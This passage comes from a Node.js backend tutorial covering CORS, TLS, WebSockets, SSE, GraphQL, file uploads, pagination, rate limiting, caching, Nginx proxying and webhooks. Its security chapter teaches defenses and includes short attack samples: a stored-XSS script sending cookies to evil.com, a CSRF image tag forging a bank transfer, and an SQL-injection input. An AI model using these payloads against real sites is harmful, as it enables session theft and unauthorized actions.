    callbackURL: '/auth/google/callback'
}, (accessToken, refreshToken, profile, done) => {
    // Find or create user
    User.findOrCreate({ googleId: profile.id }, (err, user) => {
        return done(err, user);
    });
}));

// Routes
app.get('/auth/google', passport.authenticate('google', {
    scope: ['email', 'profile']
}));

app.get('/auth/google/callback', passport.authenticate('google', {
    successRedirect: '/dashboard',
    failureRedirect: '/login'
}));
```

## Reverse Engineering Questions

| Question | Answer |
|----------|--------|
| Is this app storing passwords? | If it uses OAuth, no — Google handles auth |
| Which scopes are requested? | Determines what data the app can access |
| Is the token stored securely? | Should be HttpOnly cookie or encrypted |

---

# PART XIV — CORS

---

# Chapter 20 — Cross-Origin Resource Sharing

## The Same-Origin Policy

Browser blocks JavaScript from making requests to a different origin.

```
Origin = scheme + host + port

https://myapp.com
https://api.myapp.com  ← Different (different host)
http://myapp.com       ← Different (different scheme)
https://myapp.com:3000 ← Different (different port)
```

## Why It Exists

Without Same-Origin Policy, any website could make authenticated requests to your bank and read responses.

## CORS Flow

```
Browser at https://myapp.com
         │
         │── GET https://api.example.com/users
         │   Origin: https://myapp.com
         │
         ▼
Server at api.example.com
         │
         │── Response:
         │   Access-Control-Allow-Origin: https://myapp.com
         │   Access-Control-Allow-Methods: GET, POST, PUT, DELETE
         │   Access-Control-Allow-Credentials: true
         │
         ▼
Browser allows the response to be read
```

## Preflight Requests

For "non-simple" requests (custom headers, non-standard content types, etc.), browsers send a preflight `OPTIONS` request first.

```javascript
// "Simple" requests (no preflight):
// - GET, HEAD, POST only
// - Content-Type: application/x-www-form-urlencoded, multipart/form-data, or text/plain
// - No custom headers

// "Non-simple" requests (preflight required):
// - PUT, PATCH, DELETE
// - Content-Type: application/json
// - Custom headers (Authorization, X-Custom-Header)
```

## Preflight Flow

```
Browser
  │
  │── OPTIONS /api/users
  │   Origin: https://myapp.com
  │   Access-Control-Request-Method: DELETE
  │   Access-Control-Request-Headers: Authorization
  │
  ▼
Server
  │
  │── Response:
  │   Access-Control-Allow-Origin: https://myapp.com
  │   Access-Control-Allow-Methods: GET, POST, PUT, DELETE
  │   Access-Control-Allow-Headers: Authorization
  │   Access-Control-Max-Age: 86400
  │
  ▼
Browser
  │
  │── DELETE /api/users (actual request)
  │   Origin: https://myapp.com
  │   Authorization: Bearer token
  │
  ▼
Server
  │── Response with data
```

## Handling CORS in Express

```javascript
// Manual CORS middleware
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', 'https://myapp.com');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, PATCH, DELETE');
    res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    res.header('Access-Control-Allow-Credentials', 'true');

    // Handle preflight
    if (req.method === 'OPTIONS') {
        return res.status(204).send();
    }

    next();
});

// Or use cors package:
const cors = require('cors');

app.use(cors({
    origin: 'https://myapp.com',
    methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE'],
    credentials: true,
    maxAge: 86400
}));

// Dynamic origin (multiple allowed)
app.use(cors({
    origin: (origin, callback) => {
        const allowed = ['https://app1.com', 'https://app2.com'];
        if (!origin || allowed.includes(origin)) {
            callback(null, true);
        } else {
            callback(new Error('Not allowed by CORS'));
        }
    }
}));
```

## CORS Errors

```
Access to fetch at 'https://api.example.com/users' from origin
'https://myapp.com' has been blocked by CORS policy:
No 'Access-Control-Allow-Origin' header is present on the requested resource.
```

## Reverse Engineering Questions

| Question | Answer |
|----------|--------|
| Browser issue or server issue? | CORS is a browser restriction — fix server headers |
| Is it a preflight request? | Check for OPTIONS request before the actual request |
| Which origin is allowed? | Check `Access-Control-Allow-Origin` header |

---

# PART XV — HTTPS / TLS

---

# Chapter 21 — HTTP + TLS

## What TLS Provides

| Property | Explanation |
|----------|-------------|
| **Encryption** | Data is unreadable to intermediaries |
| **Integrity** | Data cannot be modified in transit |
| **Authentication** | You are talking to the real server (not an impostor) |

## TLS Handshake

```
Client                          Server
  │                               │
  │────── ClientHello ──────────►│  (Supported TLS versions, cipher suites)
  │◄───── ServerHello ──────────│  (Chosen TLS version, cipher)
  │◄───── Certificate ──────────│  (Server's SSL certificate)
  │◄───── ServerHelloDone ──────│
  │                               │
  │────── ClientKeyExchange ────►│  (Pre-master secret, encrypted with server's public key)
  │────── ChangeCipherSpec ─────►│
  │────── Finished ─────────────►│
  │◄───── ChangeCipherSpec ──────│
  │◄───── Finished ─────────────│
  │                               │
  │══════ Encrypted Traffic ═════►│
```

## Self-Signed Certificate for Development

```javascript
const https = require('https');
const fs = require('fs');

// Generate:
// openssl req -nodes -new -x509 -keyout key.pem -out cert.pem -days 365

const options = {
    key: fs.readFileSync('key.pem'),
    cert: fs.readFileSync('cert.pem')
};

https.createServer(options, (req, res) => {
    res.end('Secure connection!\n');
}).listen(443);
```

## HTTP → HTTPS Redirect

```javascript
const http = require('http');
const https = require('https');

// Redirect all HTTP to HTTPS
http.createServer((req, res) => {
    res.writeHead(301, { Location: `https://${req.headers.host}${req.url}` });
    res.end();
}).listen(80);

https.createServer(options, handler).listen(443);
```

---

# PART XVI — WEBSOCKETS

---

# Chapter 22 — Full-Duplex Real-Time Communication

## HTTP vs WebSocket

```
HTTP:
Client ──── Request ────► Server
Client ◄─── Response ──── Server
(Cycle ends — connection may close)

WebSocket:
Client ◄═══ Continuous ═══► Server
(Bidirectional, persistent connection)
```

## When to Use WebSockets

| Use Case | Example |
|----------|---------|
| **Real-time chat** | Slack, Discord, WhatsApp Web |
| **Live updates** | Stock prices, sports scores |
| **Collaboration** | Google Docs, Figma, VS Code Live Share |
| **Gaming** | Multiplayer browser games |
| **Notifications** | Push notifications, alerts |

## WebSocket Handshake

```
Client                                              Server
  │                                                    │
  │────── Upgrade Request ────────────────────────────►│
  │   GET /ws HTTP/1.1                                 │
  │   Upgrade: websocket                               │
  │   Connection: Upgrade                              │
  │   Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==      │
  │   Sec-WebSocket-Version: 13                        │
  │                                                    │
  │◄───── Upgrade Response ────────────────────────────│
  │   HTTP/1.1 101 Switching Protocols                  │
  │   Upgrade: websocket                               │
  │   Connection: Upgrade                              │
  │   Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo= │
  │                                                    │
  │══════ Bidirectional WebSocket ═════════════════════►│
```

## WebSocket Server (Node)

```javascript
const WebSocket = require('ws'); // npm install ws
const server = new WebSocket.Server({ port: 8080 });

server.on('connection', (ws, req) => {
    console.log('Client connected');

    // Send welcome
    ws.send(JSON.stringify({ type: 'welcome', message: 'Connected!' }));

    // Receive messages
    ws.on('message', (data) => {
        const message = JSON.parse(data.toString());
        console.log('Received:', message);

        // Echo
        ws.send(JSON.stringify({ type: 'echo', data: message }));

        // Broadcast to all clients
        server.clients.forEach(client => {
            if (client.readyState === WebSocket.OPEN) {
                client.send(JSON.stringify({
                    type: 'broadcast',
                    data: message
                }));
            }
        });
    });

    ws.on('close', () => {
        console.log('Client disconnected');
    });

    ws.on('error', (err) => {
        console.error('WebSocket error:', err);
    });
});

console.log('WebSocket server on ws://localhost:8080');
```

## WebSocket Client

```javascript
// Browser
const ws = new WebSocket('ws://localhost:8080');

ws.onopen = () => {
    console.log('Connected');
    ws.send(JSON.stringify({ text: 'Hello server!' }));
};

ws.onmessage = (event) => {
    const data = JSON.parse(event.data);
    console.log('Server:', data);
};

ws.onclose = () => console.log('Disconnected');
ws.onerror = (err) => console.error('Error:', err);

// To close:
// ws.close();
```

## WebSocket with HTTP Server (Same Port)

```javascript
const http = require('http');
const WebSocket = require('ws');

const server = http.createServer((req, res) => {
    res.end('HTTP server');
});

const wss = new WebSocket.Server({ server });

wss.on('connection', (ws) => {
    ws.send('WebSocket connected');
});

server.listen(3000);
// Both HTTP and WebSocket on port 3000
```

## Heartbeat / Keep-Alive

WebSocket connections can drop silently. Implement ping/pong:

```javascript
const wss = new WebSocket.Server({ port: 8080 });

function heartbeat() {
    this.isAlive = true;
}

wss.on('connection', (ws) => {
    ws.isAlive = true;
    ws.on('pong', heartbeat);
});

// Ping every 30 seconds
const interval = setInterval(() => {
    wss.clients.forEach((ws) => {
        if (ws.isAlive === false) return ws.terminate();

        ws.isAlive = false;
        ws.ping();
    });
}, 30000);

wss.on('close', () => clearInterval(interval));
```

## Reverse Engineering Questions

| Question | Answer |
|----------|--------|
| Real-time communication needed? | WebSocket for bidirectional, SSE for server→client |
| Is HTTP polling being used? | Could be replaced with WebSocket for efficiency |
| Connection persistence? | WebSocket stays open. HTTP closes after response |

---

# PART XVII — SERVER-SENT EVENTS (SSE)

---

# Chapter 23 — One-Way Real-Time

## SSE vs WebSocket

| Feature | SSE | WebSocket |
|---------|-----|-----------|
| Direction | Server → Client only | Bidirectional |
| Protocol | HTTP | Upgraded to ws:// |
| Auto-reconnect | Built-in (browser) | Manual implementation |
| Binary data | No (text only) | Yes |
| Browser support | Excellent (except IE) | Excellent |
| Simpler | Yes | More complex |

## SSE Server (Node)

```javascript
const http = require('http');

http.createServer((req, res) => {
    if (req.url === '/events') {
        // SSE headers
        res.writeHead(200, {
            'Content-Type': 'text/event-stream',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Access-Control-Allow-Origin': '*'
        });

        // Send events every 2 seconds
        const intervalId = setInterval(() => {
            const data = JSON.stringify({
                time: new Date().toISOString(),
                value: Math.random()
            });

            res.write(`data: ${data}\n\n`);
        }, 2000);

        // Cleanup on disconnect
        req.on('close', () => {
            clearInterval(intervalId);
            res.end();
        });
    } else {
        res.end('SSE server');
    }
}).listen(3000);
```

## SSE Client (Browser)

```javascript
const eventSource = new EventSource('http://localhost:3000/events');

eventSource.onopen = () => console.log('SSE connected');

eventSource.onmessage = (event) => {
    const data = JSON.parse(event.data);
    console.log('Event:', data);
};

eventSource.onerror = (err) => {
    console.error('SSE error:', err);
};

// Named events
eventSource.addEventListener('stock-update', (event) => {
    console.log('Stock update:', JSON.parse(event.data));
});

// To close:
// eventSource.close();
```

## SSE Event Format

```text
data: {"message": "Hello"}\n\n           ← Single event

data: {"id": 1}\n
data: {"id": 2}\n\n                      ← Two-line event

id: 12345\n                               ← Event ID (for Last-Event-ID)
event: stock-update\n                     ← Event name
data: {"symbol": "AAPL", "price": 150}\n\n
```

---

# PART XVIII — GRAPHQL

---

# Chapter 24 — Query Language for APIs

## REST vs GraphQL

```
REST:
/users         → Always returns { id, name, email, role, createdAt, ... }
/users/5/posts → Separate endpoint

GraphQL (single endpoint: /graphql):
query {
  user(id: 5) {
    name
    email
    posts {
      title
    }
  }
}
→ Returns only { name, email, posts: [{ title }] }
```

## GraphQL Schema

```graphql
type User {
    id: ID!
    name: String!
    email: String!
    posts: [Post!]!
}

type Post {
    id: ID!
    title: String!
    content: String!
    author: User!
}

type Query {
    users: [User!]!
    user(id: ID!): User
    posts: [Post!]!
}

type Mutation {
    createUser(name: String!, email: String!): User!
    deleteUser(id: ID!): Boolean!
}
```

## GraphQL Server (Node)

```javascript
const { ApolloServer, gql } = require('apollo-server');

const typeDefs = gql`
    type User {
        id: ID!
        name: String!
        email: String!
    }

    type Query {
        users: [User!]!
        user(id: ID!): User
    }

    type Mutation {
        createUser(name: String!, email: String!): User!
    }
`;

const users = [
    { id: '1', name: 'Alice', email: 'alice@test.com' },
    { id: '2', name: 'Bob', email: 'bob@test.com' }
];

const resolvers = {
    Query: {
        users: () => users,
        user: (_, { id }) => users.find(u => u.id === id)
    },
    Mutation: {
        createUser: (_, { name, email }) => {
            const user = { id: String(users.length + 1), name, email };
            users.push(user);
            return user;
        }
    }
};

const server = new ApolloServer({ typeDefs, resolvers });
server.listen(4000).then(() => console.log('GraphQL on :4000'));
```

## GraphQL Client

```javascript
// Using fetch
const query = `
    query($id: ID!) {
        user(id: $id) {
            name
            email
        }
    }
`;

fetch('/graphql', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        query,
        variables: { id: '1' }
    })
}).then(res => res.json()).then(console.log);
```

## Over-fetching vs Under-fetching

```
REST: /users returns ALL fields (over-fetching)
Response: { id, name, email, role, createdAt, updatedAt, ... }
You only need: { name, email }

REST for /users/5/posts (under-fetching):
Need user + posts → TWO requests

GraphQL:
query {
    user(id: 5) { name email posts { title } }
}
One request, exactly the fields you need
```

## GraphQL Advantages

- **Single endpoint** — no versioning needed for fields.
- **Client-specified fields** — no over-fetching.
- **Strongly typed** — schema serves as documentation.
- **Introspection** — tools like GraphiQL auto-complete queries.

## GraphQL Disadvantages

- **Complexity** — resolvers, data loaders, caching are harder.
- **N+1 problem** — naive resolvers cause many database queries.
- **Caching** — POST-based queries are harder to cache than REST GET.
- **Rate limiting** — harder (queries have different costs).

## Solving N+1 with DataLoader

```javascript
const DataLoader = require('dataloader');

const userLoader = new DataLoader(async (ids) => {
    const users = await db.users.findByIds(ids);
    // Must return in same order as ids
    return ids.map(id => users.find(u => u.id === id));
});

// Resolver uses DataLoader to batch
const resolvers = {
    Post: {
        author: (post) => userLoader.load(post.authorId)
        // Multiple posts with same authorId → batched into one query
    }
};
```

## Reverse Engineering Questions

| Question | Answer |
|----------|--------|
| REST or GraphQL? | REST: simple, cacheable, versioned. GraphQL: flexible, single endpoint |
| Is N+1 happening? | Check resolvers doing individual DB queries per item |
| Are fields being over-fetched? | GraphQL fixes this |

---

# PART XIX — FILE UPLOADS

---

# Chapter 25 — Handling File Uploads

## Multipart Form Data

```html
<form action="/upload" method="POST" enctype="multipart/form-data">
    <input type="file" name="avatar" />
    <input type="text" name="username" />
    <button type="submit">Upload</button>
</form>
```

## Server Handling

```javascript
const multer = require('multer'); // npm install multer

const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, 'uploads/');
    },
    filename: (req, file, cb) => {
        const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
        cb(null, uniqueSuffix + '-' + file.originalname);
    }
});

const upload = multer({
    storage,
    limits: {
        fileSize: 5 * 1024 * 1024 // 5 MB max
    },
    fileFilter: (req, file, cb) => {
        const allowed = ['image/jpeg', 'image/png', 'image/gif'];
        if (allowed.includes(file.mimetype)) {
            cb(null, true);
        } else {
            cb(new Error('Only JPEG, PNG, and GIF allowed'), false);
        }
    }
});

app.post('/upload', upload.single('avatar'), (req, res) => {
    console.log('File:', req.file);
    console.log('Body:', req.body);
    res.json({
        message: 'Uploaded',
        filename: req.file.filename,
        size: req.file.size
    });
});

// Multiple files
app.post('/upload-multiple', upload.array('photos', 10), (req, res) => {
    res.json({ files: req.files.map(f => f.filename) });
});
```

## Streaming Uploads (Without Multer)

```javascript
const { Writable } = require('stream');
const fs = require('fs');

app.post('/upload-stream', (req, res) => {
    const filename = `upload-${Date.now()}`;
    const writeStream = fs.createWriteStream(`uploads/${filename}`);

    req.pipe(writeStream);

    req.on('end', () => {
        res.json({ message: 'Uploaded', filename });
    });

    req.on('error', (err) => {
        res.status(500).json({ error: 'Upload failed' });
    });
});
```

---

# PART XX — PAGINATION

---

# Chapter 26 — Paginating API Responses

## Offset-Based Pagination

```javascript
// GET /api/users?page=2&limit=20

app.get('/api/users', (req, res) => {
    const page = parseInt(req.query.page) || 1;
    const limit = parseInt(req.query.limit) || 20;
    const offset = (page - 1) * limit;

    const results = db.users.slice(offset, offset + limit);
    const total = db.users.length;

    res.json({
        data: results,
        pagination: {
            page,
            limit,
            total,
            totalPages: Math.ceil(total / limit),
            hasNext: offset + limit < total,
            hasPrev: page > 1
        }
    });
});

// Response:
// {
//   "data": [...],
//   "pagination": {
//     "page": 2,
//     "limit": 20,
//     "total": 150,
//     "totalPages": 8,
//     "hasNext": true,
//     "hasPrev": true
//   }
// }
```

## Cursor-Based Pagination

Better for real-time data where new items are inserted.

```javascript
// GET /api/users?cursor=eyJpZCI6MTAwfQ&limit=20

app.get('/api/users', (req, res) => {
    const limit = parseInt(req.query.limit) || 20;
    const cursor = req.query.cursor
        ? JSON.parse(Buffer.from(req.query.cursor, 'base64').toString())
        : null;

    let query = db.users.sort((a, b) => a.id - b.id);

    if (cursor) {
        query = query.filter(u => u.id > cursor.id);
    }

    const results = query.slice(0, limit + 1);
    const hasNext = results.length > limit;
    const data = hasNext ? results.slice(0, limit) : results;

    const nextCursor = hasNext
        ? Buffer.from(JSON.stringify({ id: data[data.length - 1].id })).toString('base64')
        : null;

    res.json({
        data,
        pagination: {
            nextCursor,
            hasNext
        }
    });
});
```

## Offset vs Cursor

| Feature | Offset | Cursor |
|---------|--------|--------|
| Page jumps | Yes (go to page 5) | No (must traverse) |
| Real-time inserts | Duplicates/shifts possible | Stable |
| Performance on large offset | Slower (OFFSET 100000) | Fast (WHERE id > cursor) |
| Complexity | Simple | Slightly more complex |

## Reverse Engineering Questions

| Question | Answer |
|----------|--------|
| Is pagination needed? | Yes if dataset > 100 items |
| Offset or cursor? | Offset for simple data. Cursor for real-time/large data |

---

# PART XXI — RATE LIMITING

---

# Chapter 27 — Protecting APIs from Abuse

## Why Rate Limit

- Prevent brute-force attacks.
- Prevent DDoS.
- Prevent accidental runaway scripts.
- Ensure fair resource usage.

## Rate Limiting Algorithms

| Algorithm | How it works |
|-----------|-------------|
| **Fixed Window** | Reset counter every N seconds. Simple but burst at boundary. |
| **Sliding Window** | Rolling time window. More accurate. |
| **Token Bucket** | Tokens refill at fixed rate. Allows bursts. |
| **Leaky Bucket** | Requests processed at fixed rate. Smooths bursts. |

## Fixed Window Implementation

```javascript
const rateLimit = new Map();

function rateLimiter(maxRequests, windowMs) {
    return (req, res, next) => {
        const ip = req.ip || req.connection.remoteAddress;
        const now = Date.now();
        const windowStart = Math.floor(now / windowMs);

        const key = `${ip}:${windowStart}`;

        if (!rateLimit.has(key)) {
            rateLimit.set(key, { count: 1, start: now });

            // Cleanup old entries
            if (rateLimit.size > 10000) {
                const oldest = now - windowMs * 2;
                for (const [k, v] of rateLimit) {
                    if (v.start < oldest) rateLimit.delete(k);
                }
            }
        } else {
            const entry = rateLimit.get(key);
            entry.count++;

            if (entry.count > maxRequests) {
                return res.status(429).json({
                    error: 'Too many requests',
                    retryAfter: Math.ceil((windowMs - (now - entry.start)) / 1000)
                });
            }
        }

        next();
    };
}

// Apply
app.use('/api/auth', rateLimiter(5, 60000)); // 5 requests per minute
app.use('/api', rateLimiter(100, 60000));     // 100 requests per minute
```

## express-rate-limit

```javascript
const rateLimit = require('express-rate-limit');

const limiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 100, // 100 requests per window per IP
    standardHeaders: true,
    legacyHeaders: false,
    message: {
        error: 'Too many requests',
        retryAfter: '15 minutes'
    }
});

app.use('/api', limiter);
```

## Reverse Engineering Questions

| Question | Answer |
|----------|--------|
| Abuse prevention required? | Yes for auth endpoints, API endpoints |
| What limit is appropriate? | Depends on expected traffic and server capacity |

---

# PART XXII — CACHING

---

# Chapter 28 — Caching Strategies

## Why Cache

```
Without cache:  Request → Database → Response  (~100ms)
With cache:     Request → Cache hit → Response  (~1ms)
```

100x faster.

## Caching Layers

```
Browser Cache (Memory Cache, Disk Cache)
         ↓
CDN Cache (Cloudflare, Akamai, Fastly)
         ↓
API Gateway Cache
         ↓
Application Cache (In-memory, Redis)
         ↓
Database Cache (Query cache, Buffer pool)
         ↓
Database
```

## Cache Headers

```javascript
// Force caching for 1 hour
res.setHeader('Cache-Control', 'public, max-age=3600');

// No caching
res.setHeader('Cache-Control', 'no-store');

// Cache but revalidate
res.setHeader('Cache-Control', 'no-cache');
res.setHeader('ETag', '"abc123"');

// Conditional request (browser sends If-None-Match)
app.get('/api/data', (req, res) => {
    const data = getData();
    const etag = computeEtag(data);

    if (req.headers['if-none-match'] === etag) {
        return res.status(304).send(); // Not modified
    }

    res.setHeader('ETag', etag);
    res.json(data);
});
```

## Application Cache (Redis)

```javascript
const redis = require('redis');
const client = redis.createClient();

const cacheMiddleware = (expireSeconds) => {
    return async (req, res, next) => {
        const key = `cache:${req.originalUrl}`;

        const cached = await client.get(key);

        if (cached) {
            return res.json(JSON.parse(cached));
        }

        // Capture the response
        const originalJson = res.json.bind(res);
        res.json = (body) => {
            client.setEx(key, expireSeconds, JSON.stringify(body));
            originalJson(body);
        };

        next();
    };
};

app.get('/api/expensive', cacheMiddleware(60), (req, res) => {
    const data = expensiveOperation();
    res.json(data);
});
```

## Cache Invalidation

The two hard problems in CS:

- **TTL-based**: Let cache expire naturally.
- **Event-based**: Clear cache when data changes.

```javascript
// Invalidate on write
app.post('/api/users', async (req, res) => {
    const user = await db.createUser(req.body);

    // Clear related caches
    await client.del('cache:/api/users');
    await client.del('cache:/api/users/count');

    res.status(201).json(user);
});
```

## Reverse Engineering Questions

| Question | Answer |
|----------|--------|
| Cache hit or miss? | Check response headers, measure latency |
| Can this response be cached? | If data changes infrequently → yes |
| Where to cache? | Browser, CDN, Redis, or in-memory |

---

# PART XXIII — API VERSIONING

---

# Chapter 29 — Avoiding Breaking Changes

## URL Versioning

```
GET /v1/users     → Returns { id, name, email }
GET /v2/users     → Returns { id, name, email, role }
```

```javascript
const v1Router = express.Router();
const v2Router = express.Router();

v1Router.get('/users', (req, res) => {
    res.json(users.map(u => ({ id: u.id, name: u.name, email: u.email })));
});

v2Router.get('/users', (req, res) => {
    res.json(users);
});

app.use('/v1', v1Router);
app.use('/v2', v2Router);
```

## Header Versioning

```
GET /users
Accept: application/vnd.myapp.v1+json

GET /users
Accept: application/vnd.myapp.v2+json
```

```javascript
app.use((req, res, next) => {
    const accept = req.headers.accept || '';

    if (accept.includes('vnd.myapp.v2')) {
        req.apiVersion = 2;
    } else {
        req.apiVersion = 1;
    }

    next();
});
```

---

# PART XXIV — SECURITY

---

# Chapter 30 — Common Attacks and Defenses

## XSS (Cross-Site Scripting)

**Attack**: Inject malicious script into a web page.

```html
<!-- Stored XSS: User submits: -->
<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>

<!-- Reflected XSS: URL parameter: -->
?q=<script>alert('XSS')</script>
```

**Defense**:

```javascript
// Always escape user input
const escapeHtml = (str) => {
    return str
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
};

// Content Security Policy header
res.setHeader('Content-Security-Policy',
    "default-src 'self'; script-src 'self' https://trusted.cdn.com"
);

// HttpOnly cookies (prevents JS from reading cookies)
res.cookie('sessionId', token, { httpOnly: true, secure: true });
```

## CSRF (Cross-Site Request Forgery)

**Attack**: Malicious site makes authenticated requests on behalf of the user.

```html
<!-- User visits evil.com, which contains: -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" />
<!-- Browser sends the user's cookies automatically -->
```

**Defense**:

```javascript
// 1. SameSite cookies (modern browsers)
res.cookie('sessionId', token, { sameSite: 'strict' });

// 2. CSRF tokens
app.use((req, res, next) => {
    const csrfToken = crypto.randomUUID();
    req.csrfToken = csrfToken;
    res.cookie('csrf-token', csrfToken, { httpOnly: true });
    next();
});

app.post('/api/transfer', (req, res) => {
    const csrfCookie = req.cookies['csrf-token'];
    const csrfHeader = req.headers['x-csrf-token'];

    if (csrfCookie !== csrfHeader) {
        return res.status(403).json({ error: 'CSRF validation failed' });
    }

    // Process request
});

// 3. Check Origin/Referer header
if (req.headers.origin !== 'https://myapp.com') {
    return res.status(403).send('Forbidden');
}
```

## SQL Injection

**Attack**: Inject SQL commands via user input.

```javascript
// VULNERABLE: string concatenation
const query = `SELECT * FROM users WHERE name = '${userInput}'`;
// Input: "' OR '1'='1" → SELECT * FROM users WHERE name = '' OR '1'='1'
// Returns ALL users

// SAFE: parameterized queries
db.query('SELECT * FROM users WHERE name = $1', [userInput]);
// Or with ORM:
User.findOne({ where: { name: userInput } });
```

## Other Security Headers

```javascript
// Helmet middleware (sets security headers)
const helmet = require('helmet');
app.use(helmet());

// Individual headers:
res.setHeader('X-Content-Type-Options', 'nosniff');
res.setHeader('X-Frame-Options', 'DENY'); // Prevent clickjacking
res.setHeader('X-XSS-Protection', '1; mode=block');
res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
res.setHeader('Referrer-Policy', 'no-referrer');
res.setHeader('Permissions-Policy', 'geolocation=(), microphone=()');
```

## Rate Limiting Against Brute Force

```javascript
// Progressive delay on failed login attempts
const loginAttempts = new Map();

app.post('/login', async (req, res) => {
    const ip = req.ip;
    const attempts = loginAttempts.get(ip) || 0;

    if (attempts >= 5) {
        const delay = Math.min(1000 * Math.pow(2, attempts - 5), 60000);
        await new Promise(resolve => setTimeout(resolve, delay));
    }

    const valid = await verifyPassword(req.body);
    if (!valid) {
        loginAttempts.set(ip, (loginAttempts.get(ip) || 0) + 1);
        return res.status(401).json({ error: 'Invalid credentials' });
    }

    loginAttempts.delete(ip);
    // Login success
});
```

## Reverse Engineering Questions

| Question | Answer |
|----------|--------|
| Which attack is possible? | XSS, CSRF, SQLi, MITM, Brute force, Replay |
| Which defense exists? | HttpOnly, SameSite, CSP, CSRF tokens, rate limiting |
| Is HTTPS used? | Must be for production |
| Are cookies HttpOnly? | Prevents XSS from stealing cookies |
| Is input validated/sanitized? | Prevents injection attacks |

---

# PART XXV — API GATEWAY

---

# Chapter 31 — Single Entry Point for Microservices

## Architecture

```
Client
  │
  ▼
API Gateway (authentication, rate limiting, routing)
  │
  ├──► Users Service
  ├──► Orders Service
  ├──► Payments Service
  └──► Notifications Service
```

## Simple API Gateway

```javascript
const http = require('http');
const httpProxy = require('http-proxy');

const proxy = httpProxy.createProxyServer();

const services = {
    '/users': 'http://localhost:3001',
    '/orders': 'http://localhost:3002',
    '/payments': 'http://localhost:3003'
};

const server = http.createServer((req, res) => {
    // Find target based on path prefix
    const prefix = Object.keys(services).find(p => req.url.startsWith(p));

    if (!prefix) {
        return res.writeHead(404).end('Not found');
    }

    // Authenticate (check JWT)
    const authHeader = req.headers.authorization;
    if (!authHeader) {
        return res.writeHead(401).end('Unauthorized');
    }

    // Rate limit
    // Logging
    // Transform request/response

    proxy.web(req, res, { target: services[prefix] });
});

server.listen(8080);
```

## Responsibilities

| Responsibility | Description |
|---------------|-------------|
| Authentication | Verify JWT/session before routing |
| Rate limiting | Per-client limits |
| Routing | Forward to correct microservice |
| Request/Response transformation | Modify headers, format |
| Aggregation | Combine responses from multiple services |
| Logging/Metrics | Centralized observability |
| Caching | Cache responses for frequent queries |

---

# PART XXVI — REVERSE PROXY

---

# Chapter 32 — Nginx as Reverse Proxy

## What a Reverse Proxy Does

```
Internet
  │
  ▼
Reverse Proxy (Nginx, HAProxy, Caddy)
  │
  ├──► Node.js App (:3000)
  ├──► Static Files (/var/www)
  └──► Another Service (:4000)
```

## Nginx Configuration

```nginx
server {
    listen 80;
    server_name api.example.com;

    # Redirect to HTTPS
    return 301 https://$host$request_uri;
}

server {
    listen 443 ssl;
    server_name api.example.com;

    ssl_certificate /etc/ssl/certs/example.com.pem;
    ssl_certificate_key /etc/ssl/private/example.com.key;

    # Proxy to Node.js
    location /api/ {
        proxy_pass http://localhost:3000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }

    # Static files (no proxy needed)
    location /static/ {
        root /var/www;
        expires 30d;
        add_header Cache-Control "public, immutable";
    }

    # WebSocket support
    location /ws/ {
        proxy_pass http://localhost:3000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
    }
}
```

## Benefits

| Benefit | Explanation |
|---------|-------------|
| **SSL termination** | Nginx handles HTTPS, Node handles plain HTTP |
| **Compression** | Nginx compresses responses (gzip, brotli) |
| **Load balancing** | Distribute across multiple Node instances |
| **Static file serving** | Nginx is faster than Node for static files |
| **Security** | Hide internal server details, DDoS protection |
| **Caching** | Cache responses at the proxy level |

---

# PART XXVII — LOAD BALANCING

---

# Chapter 33 — Distributing Traffic

## Algorithms

| Algorithm | How it works | When to use |
|-----------|-------------|-------------|
| **Round Robin** | Requests distributed evenly in sequence | Equal capacity servers |
| **Least Connections** | Sends to server with fewest active connections | Unequal load, long-lived connections |
| **IP Hash** | Same client IP always goes to same server | Session affinity (sticky sessions) |
| **Weighted** | Servers receive proportionally based on weight | Different server capacities |

## Node.js Cluster vs Nginx Load Balancing

```
Node Cluster: All workers on same machine, share port
Client → Master → Worker 1
               → Worker 2
               → Worker 3

Nginx Load Balancer: Across multiple machines
Client → Nginx → Server 1 (:3000)
              → Server 2 (:3000)
              → Server 3 (:3000)
```

## Nginx Load Balancing Configuration

```nginx
upstream node_backend {
    # Round robin (default)
    server 10.0.0.1:3000 weight=3;
    server 10.0.0.2:3000 weight=1;
    server 10.0.0.3:3000 backup;  # Only used if others down

    # OR: least connections
    # least_conn;

    # OR: IP hash
    # ip_hash;
}

server {
    listen 80;
    location / {
        proxy_pass http://node_backend;
    }
}
```

---

# PART XXVIII — WEBHOOKS

---

# Chapter 34 — Server-to-Server Callbacks

## What are Webhooks?

**Webhook**: When an event happens, Service A sends an HTTP POST to Service B's URL.

```
Stripe (Payment Event)
  │
  │── POST https://myapp.com/webhooks/stripe
  │   { "type": "charge.succeeded", "data": { ... } }
  │
  ▼
My App processes the event
```

## Webhook Receiver

```javascript
app.post('/webhooks/stripe', (req, res) => {
    const sig = req.headers['stripe-signature'];

    try {
        // Verify webhook signature
        const event = stripe.webhooks.constructEvent(
            req.body,
            sig,
            process.env.STRIPE_WEBHOOK_SECRET
        );

        // Process event
        switch (event.type) {
            case 'charge.succeeded':
                handleChargeSucceeded(event.data.object);
                break;
            case 'customer.subscription.updated':
                handleSubscriptionUpdated(event.data.object);
                break;
        }

        // Acknowledge receipt quickly (200)
        res.status(200).json({ received: true });
    } catch (err) {
